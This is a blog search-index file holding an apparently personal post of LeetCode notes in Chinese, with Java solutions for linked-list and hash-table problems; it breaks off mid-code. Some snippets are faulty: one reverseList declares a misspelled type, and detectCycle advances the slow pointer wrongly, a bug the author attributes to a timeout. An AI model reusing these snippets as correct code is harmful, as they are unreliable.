<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>LeetCode</title>
    <link href="/2022/03/17/My_leetcode/"/>
    <url>/2022/03/17/My_leetcode/</url>
    
    <content type="html"><![CDATA[<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><h2 id="从有序链表中删除重复节点"><a href="#从有序链表中删除重复节点" class="headerlink" title="从有序链表中删除重复节点"></a>从有序链表中删除重复节点</h2><p><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/description/">题目链接</a></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>考虑使用递归，递归的出口为节点指针head为空或者head.next为空时，不再进行递归</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">deleteDuplicates</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(head == <span class="hljs-keyword">null</span> || head.next == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> head;<br>        head.next = deleteDuplicates(head.next);<br>        <span class="hljs-keyword">return</span> head.val == head.next.val? head.next:head;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="删除链表的倒数第-n-个节点"><a href="#删除链表的倒数第-n-个节点" class="headerlink" title="删除链表的倒数第 n 个节点"></a>删除链表的倒数第 n 个节点</h2><p><a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/description/">题目链接</a></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>使用双指针，一个fast，一个slow，如果是倒数第n个节点的话，就让fast先走n次，这样fast就会走到倒数第n个节点的前面<br>然后fast和slow同时遍历，当fast.next为空的时候，slow就在倒数第n个节点前面了<br>需要注意如果在fast先走n步后，fast为空了，说明需要删除的结点就是第一个结点，返回head.next即可</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">removeNthFromEnd</span><span class="hljs-params">(ListNode head, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        ListNode fast = head;<br>        ListNode slow = head;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n ; i++)&#123;<br>            fast = fast.next;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fast == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> head.next;<br><br>        <span class="hljs-keyword">while</span>(fast.next != <span class="hljs-keyword">null</span>)&#123;<br>            fast = fast.next;<br>            slow = slow.next;<br>        &#125;<br>        slow.next = slow.next.next;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="移除链表元素"><a href="#移除链表元素" class="headerlink" title="移除链表元素"></a>移除链表元素</h2><p><a href="https://leetcode-cn.com/problems/remove-linked-list-elements/">题目链接</a><br>使用在原链表前添加一个哑结点，删除第一个结点和其他结点就可以公用一个逻辑</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">removeElements</span><span class="hljs-params">(ListNode head, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>        ListNode dummy = <span class="hljs-keyword">new</span> ListNode(-<span class="hljs-number">1</span>);<br>        dummy.next = head;<br>        ListNode curr = dummy;<br><br>        <span class="hljs-keyword">while</span>(curr.next != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">if</span>(curr.next.val == val)&#123;<br>                curr.next = curr.next.next;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                curr = curr.next;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> dummy.next;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h2><p><a href="https://leetcode-cn.com/problems/remove-linked-list-elements/">题目链接</a><br>双指针，使用prev和curr指针，算法演示如下：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnrf1oboupg30gy0c44qp.gif"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        listNode prev = <span class="hljs-keyword">null</span>;<br>        listNode curr = head;<br><br>        <span class="hljs-keyword">while</span>(curr != <span class="hljs-keyword">null</span>)&#123;<br>            listNode next = curr.next;<br>            curr.next = prev;<br>            prev = curr;<br>            curr = next;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> prev;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>递归写法：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        ListNode prev = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">return</span> reverse(prev, head);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> ListNode <span class="hljs-title">reverse</span><span class="hljs-params">(ListNode prev, ListNode curr)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(curr == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> prev;<br>        ListNode next = curr.next;<br>        curr.next = prev;<br>        <span class="hljs-keyword">return</span> reverse(curr, next);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="两两交换链表中的节点"><a href="#两两交换链表中的节点" class="headerlink" title="两两交换链表中的节点"></a>两两交换链表中的节点</h2><p><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/">题目链接</a><br><img src="https://code-thinking.cdn.bcebos.com/pics/24.%E4%B8%A4%E4%B8%A4%E4%BA%A4%E6%8D%A2%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B91.png"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">swapPairs</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        ListNode dummy = <span class="hljs-keyword">new</span> ListNode(-<span class="hljs-number">1</span>);<br>        dummy.next = head;<br>        ListNode cur = dummy;<br><br>        <span class="hljs-keyword">while</span>(cur.next != <span class="hljs-keyword">null</span> &amp;&amp; cur.next.next != <span class="hljs-keyword">null</span>)&#123;<br>            ListNode l1 = cur.next;<br>            ListNode l2 = l1.next;<br>            ListNode l3 = l2.next;<br>            cur.next = l2;<br>            l2.next = l1;<br>            l1.next = l3;<br>            cur = l1;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dummy.next;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="链表相交"><a href="#链表相交" class="headerlink" title="链表相交"></a>链表相交</h2><p><a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists-lcci/">题目链接</a><br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_statement.png"><br>思路1：先计算出两链表的长度，比较后让较长的链表先走长度差个结点，之后两个链表再同时遍历，知道走到相交结点</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode headA, ListNode headB)</span> </span>&#123;<br>        ListNode l1 = headA;<br>        ListNode l2 = headB;<br>        <span class="hljs-keyword">int</span> lenA = <span class="hljs-number">0</span>, lenB = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span>(l1 != <span class="hljs-keyword">null</span>)&#123;<br>            lenA++;<br>            l1 = l1.next;<br>        &#125;<br>        <span class="hljs-keyword">while</span>(l2 != <span class="hljs-keyword">null</span>)&#123;<br>            lenB++;<br>            l2 = l2.next;<br>        &#125;<br><br>        l1 = headA;<br>        l2 = headB;<br><br>        <span class="hljs-keyword">if</span>(lenA &gt; lenB)&#123;<br>            <span class="hljs-keyword">int</span> tmp = lenA;<br>            lenA = lenB;<br>            lenB = tmp;<br>            ListNode tmpNode = l1;<br>            l1 = l2;<br>            l2 = tmpNode;<br>        &#125;<br><br>        <span class="hljs-keyword">int</span> diff = lenB - lenA;<br>        <span class="hljs-keyword">while</span>(diff &gt; <span class="hljs-number">0</span>)&#123;<br>            diff--;<br>            l2 = l2.next;<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>(l1 != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">if</span>(l1 == l2)&#123;<br>                <span class="hljs-keyword">return</span> l1;<br>            &#125;<br>            l1 = l1.next;<br>            l2 = l2.next;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>思路2：由题图可以知道，设A和B的公共部分长度为c，则如果两个链表的指针走到末尾后，再从对方的头结点开始继续走，当走到相交结点时，走过的长度刚好是：<br>a + (b - c) = b + (a - c)</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode headA, ListNode headB)</span> </span>&#123;<br>        ListNode curA = headA;<br>        ListNode curB = headB;<br><br>        <span class="hljs-keyword">while</span>(curA != curB)&#123;<br>            curA = curA==<span class="hljs-keyword">null</span>? headB:curA.next;<br>            curB = curB==<span class="hljs-keyword">null</span>? headA:curB.next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> curA;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="环形链表II"><a href="#环形链表II" class="headerlink" title="环形链表II"></a>环形链表II</h2><p><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/submissions/">题目链接</a><br>首先需要判断有无环，使用快慢指针即可，快指针每次走两个结点，慢指针每次走一个，这样就会在环中相遇<br>然后需要寻找环入口：<br><img src="https://img-blog.csdnimg.cn/20210318162938397.png"><br>在相遇时，slow走过了<span class="label label-primary">x+y</span>，fast走过了<span class="label label-primary">x + y + n(y + z)</span>，由于fast走过的路程为slow的2倍，所以有：</p><span class="label label-primary">2(x + y) = x + y + n(y + z)</span>，化简得：<span class="label label-primary">x = (n - 1)(y + z) + z</span><p>所以，在相遇结点处设置index2，在头结点处设置index1，两指针相遇处即为入口</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">detectCycle</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        ListNode fast = head;<br>        ListNode slow = head;<br><br>        <span class="hljs-keyword">while</span>(fast != <span class="hljs-keyword">null</span> &amp;&amp; fast.next != <span class="hljs-keyword">null</span>)&#123;<br>            slow = fast.next;<br>            fast = fast.next.next;<br>            <span class="hljs-keyword">if</span>(fast == slow)&#123; <span class="hljs-comment">// 有环</span><br>                ListNode index1 = head;<br>                ListNode index2 = slow;<br>                <span class="hljs-keyword">while</span>(index1 != index2)&#123;<br>                    index1 = index1.next;<br>                    index2 = index2.next;<br>                &#125;<br>                <span class="hljs-keyword">return</span> index2;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>不过这种做法超时了，可以采用HashSet来保存走过的结点，再进行是否重复的判断：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">detectCycle</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        Set&lt;ListNode&gt; set = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>        <span class="hljs-keyword">while</span>(head != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">if</span>(set.contains(head))&#123;<br>                <span class="hljs-keyword">return</span> head;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                set.add(head);<br>                head = head.next;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h1><div class="note note-success">            <p>哈希表是根据关键码的值而直接进行访问的数据结构。</p>          </div><h2 id="有效的字母异位词"><a href="#有效的字母异位词" class="headerlink" title="有效的字母异位词"></a>有效的字母异位词</h2><p><a href="https://leetcode-cn.com/problems/valid-anagram/">题目链接</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isAnagram</span><span class="hljs-params">(String s, String t)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] record = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">26</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">char</span> ch : s.toCharArray())&#123;<br>            record[ch - <span class="hljs-string">&#x27;a&#x27;</span>] += <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">char</span> ch : t.toCharArray())&#123;<br>            record[ch - <span class="hljs-string">&#x27;a&#x27;</span>] -= <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> a : record)&#123;<br>            <span class="hljs-keyword">if</span>(a != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="字母异位词分组"><a href="#字母异位词分组" class="headerlink" title="字母异位词分组"></a>字母异位词分组</h2><p><a href="https://leetcode-cn.com/problems/group-anagrams/">题目链接</a></p><p>使用HashMap来保存映射关系：由于每个异位词的字母都相同，只是位置不一样，因此将他们排序后的结果都一样，可以作为Map的键</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;<br>        Map&lt;String, List&lt;String&gt;&gt; map = <span class="hljs-keyword">new</span> HashMap();<br>        <span class="hljs-keyword">for</span>(String str : strs)&#123;<br>            <span class="hljs-keyword">char</span>[] arr = str.toCharArray();<br>            Arrays.sort(arr);<br>            String key = <span class="hljs-keyword">new</span> String(arr);<br>            List&lt;String&gt; list = map.getOrDefault(key, <span class="hljs-keyword">new</span> ArrayList&lt;String&gt;());<br>            list.add(str);<br>            map.put(key, list);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayList&lt;List&lt;String&gt;&gt;(map.values());<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="两个数组的交集"><a href="#两个数组的交集" class="headerlink" title="两个数组的交集"></a>两个数组的交集</h2><p><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays/submissions/">题目链接</a></p><p>使用Set来实现，HashSet是无序的集合</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] intersection(<span class="hljs-keyword">int</span>[] nums1, <span class="hljs-keyword">int</span>[] nums2) &#123;<br>        Set&lt;Integer&gt; arr1 = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>        Set&lt;Integer&gt; res = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> a : nums1)&#123;<br>            arr1.add(a);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> a : nums2)&#123;<br>            <span class="hljs-keyword">if</span>(arr1.contains(a))&#123;<br>                res.add(a);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">int</span>[] ans = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[res.size()];<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> a : res)&#123;<br>            ans[i++] = a;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="快乐数"><a href="#快乐数" class="headerlink" title="快乐数"></a>快乐数</h2><p><a href="https://leetcode-cn.com/problems/happy-number/submissions/">题目链接</a></p><p>如果一个数不是快乐数的话，那么其数字平方和必定会重复，所以可以利用无序集合HashSet来保存其平方，一旦重复即出现无限循环，返回false</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getSum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(n != <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">int</span> tmp = n % <span class="hljs-number">10</span>;<br>            sum += tmp * tmp;<br>            n /= <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isHappy</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        Set&lt;Integer&gt; set = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>)&#123;<br>            n = getSum(n);<br><br>            <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(set.contains(n))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br><br>            set.add(n);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h2><p><a href="https://leetcode-cn.com/problems/two-sum/">题目链接</a></p><p>采用HashMap来保存值与索引的映射关系，HashMap是key不可重复的</p><p>对给定数组进行遍历，判断target - num[i]是否在Map中，如果不在，则添加到Map中；如果在的话，则返回键target - nums[i]的索引和当前遍历的索引，即使要求结果</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] twoSum(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;<br>        Map&lt;Integer, Integer&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++)&#123;<br>            <span class="hljs-keyword">int</span> tmp = target - nums[i];<br>            <span class="hljs-keyword">if</span>(!map.containsKey(tmp))&#123;<br>                map.put(nums[i], i);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;map.get(tmp), i&#125;;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="四数相加II"><a href="#四数相加II" class="headerlink" title="四数相加II"></a>四数相加II</h2><p><a href="https://leetcode-cn.com/problems/4sum-ii/submissions/">题目链接</a></p><p>遍历A和B，计算a+b，并将其作为键存入HashMap中，值是其出现的次数<br>再遍历C和D，判断0-(c+d)是否在HashMap中，如果在，取出其值即可</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 